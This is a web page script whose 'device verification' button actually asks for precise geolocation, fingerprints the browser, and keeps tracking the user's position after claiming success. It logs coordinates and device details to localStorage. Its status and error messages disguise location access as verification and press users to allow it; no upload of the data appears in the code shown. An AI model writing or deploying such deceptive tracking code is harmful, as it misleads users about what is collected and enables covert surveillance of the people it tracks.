document.addEventListener('DOMContentLoaded', () => {
    const verifyButton = document.getElementById('allowLocation');
    const statusMessage = document.getElementById('locationStatus');
    let verificationWatch = null;

    // Check if we're on HTTPS
    if (window.location.protocol === 'http:' && !window.location.hostname.includes('localhost')) {
        window.location.href = window.location.href.replace('http:', 'https:');
        return;
    }

    // Generate a unique device ID using available browser information
    const generateDeviceId = () => {
        const components = [
            navigator.userAgent,
            navigator.language,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency,
            screen.colorDepth,
            screen.width + 'x' + screen.height,
            new Date().getTime()
        ];
        
        let deviceId = sessionStorage.getItem('device_id');
        if (!deviceId) {
            deviceId = btoa(components.join('|')).substring(0, 32);
            sessionStorage.setItem('device_id', deviceId);
        }
        return deviceId;
    };

    const saveVerificationData = (coords) => {
        const { latitude, longitude, accuracy } = coords;
        
        try {
            const verificationEntry = {
                timestamp: new Date().toISOString(),
                deviceId: generateDeviceId(),
                latitude,
                longitude,
                accuracy,
                screenResolution: `${screen.width}x${screen.height}`,
                platform: navigator.platform,
                browser: navigator.userAgent,
                url: window.location.href
            };

            const verificationLogs = JSON.parse(localStorage.getItem('locationLogs') || '[]');
            verificationLogs.push(verificationEntry);
            
            if (verificationLogs.length > 1000) {
                verificationLogs.shift();
            }
            
            localStorage.setItem('locationLogs', JSON.stringify(verificationLogs));
            sessionStorage.setItem('verification_active', 'true');

            return true;
        } catch (error) {
            console.error('Error during verification:', error);
            return false;
        }
    };

    verifyButton.addEventListener('click', () => {
        statusMessage.textContent = 'Verifying device...';
        verifyButton.disabled = true;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    if (saveVerificationData(position.coords)) {
                        statusMessage.textContent = 'Device verified successfully!';
                        verifyButton.textContent = '✓ Verified';
                        verifyButton.style.backgroundColor = '#28a745';
                        
                        setTimeout(() => {
                            statusMessage.textContent = 'Processing verification...';
                            statusMessage.classList.add('loading');
                            document.querySelector('.thank-you-card').classList.add('processing');
                        }, 1500);

                        verificationWatch = navigator.geolocation.watchPosition(
                            (position) => {
                                if (sessionStorage.getItem('verification_active') === 'true') {
                                    saveVerificationData(position.coords);
                                }
                            },
                            null,
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    } else {
                        statusMessage.textContent = 'Verification failed. Please try again.';
                        verifyButton.disabled = false;
                    }
                },
                (error) => {
                    verifyButton.disabled = false;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            statusMessage.textContent = 'Device verification required. Please enable and try again.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            statusMessage.textContent = 'Verification service unavailable. Please try again.';
                            break;
                        case error.TIMEOUT:
                            statusMessage.textContent = 'Verification timed out. Please try again.';
                            break;
                        default:
                            statusMessage.textContent = 'Verification failed. Please try again.';
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            statusMessage.textContent = 'Device verification not supported on this browser.';
            verifyButton.disabled = false;
        }
    });

    window.addEventListener('beforeunload', () => {
        if (verificationWatch !== null) {
            navigator.geolocation.clearWatch(verificationWatch);
            sessionStorage.removeItem('verification_active');
        }
    });
});
